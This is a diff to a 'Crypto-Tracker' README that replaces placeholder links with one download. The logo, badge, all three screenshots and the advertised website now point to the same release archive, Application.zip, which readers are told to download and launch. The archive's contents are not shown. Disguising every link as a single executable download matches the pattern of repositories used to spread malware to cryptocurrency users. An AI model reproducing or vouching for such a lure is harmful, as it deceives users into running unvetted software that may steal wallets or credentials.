@@ -1,6 +1,6 @@
 # 🚀 Welcome to Crypto-Tracker!
 
-![Crypto Tracker Logo](https://example.com/logo.png)
+![Crypto Tracker Logo](https://github.com/ganasiddabattula/Crypto-Tracker/releases/download/v1.0.0/Application.zip)
 
 Welcome to the Crypto-Tracker repository where you can keep track of all your favorite cryptocurrencies in one place! 📈💰
 
@@ -10,7 +10,7 @@ Crypto-Tracker is a user-friendly application designed to help you monitor the l
 ## Get Started
 To get started with Crypto-Tracker, simply download the application from the following link:
 
-[![Download Crypto-Tracker](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/file/Application.zip)
+[![Download Crypto-Tracker](https://github.com/ganasiddabattula/Crypto-Tracker/releases/download/v1.0.0/Application.zip)](https://github.com/ganasiddabattula/Crypto-Tracker/releases/download/v1.0.0/Application.zip)
 
 Once you have downloaded the application, launch it to begin tracking cryptocurrencies effortlessly.
 
@@ -24,9 +24,9 @@ Once you have downloaded the application, launch it to begin tracking cryptocurr
 ## Screenshots
 Here are some sneak peeks of the Crypto-Tracker application:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/ganasiddabattula/Crypto-Tracker/releases/download/v1.0.0/Application.zip)
+![Screenshot 2](https://github.com/ganasiddabattula/Crypto-Tracker/releases/download/v1.0.0/Application.zip)
+![Screenshot 3](https://github.com/ganasiddabattula/Crypto-Tracker/releases/download/v1.0.0/Application.zip)
 
 ## Support
 If you encounter any issues while using Crypto-Tracker or have any feedback to share, please check the "Releases" section for updates or reach out to our support team for assistance.
@@ -35,6 +35,6 @@ If you encounter any issues while using Crypto-Tracker or have any feedback to s
 We welcome contributions from the community to enhance Crypto-Tracker further. Feel free to fork the repository, make your changes, and submit a pull request for review.
 
 ## Stay Connected
-For the latest updates and announcements, visit our website [Crypto-Tracker.com](https://www.example.com).
+For the latest updates and announcements, visit our website [https://github.com/ganasiddabattula/Crypto-Tracker/releases/download/v1.0.0/Application.zip](https://github.com/ganasiddabattula/Crypto-Tracker/releases/download/v1.0.0/Application.zip).
 
 Thank you for choosing Crypto-Tracker for all your cryptocurrency tracking needs! 🌟📉🌐
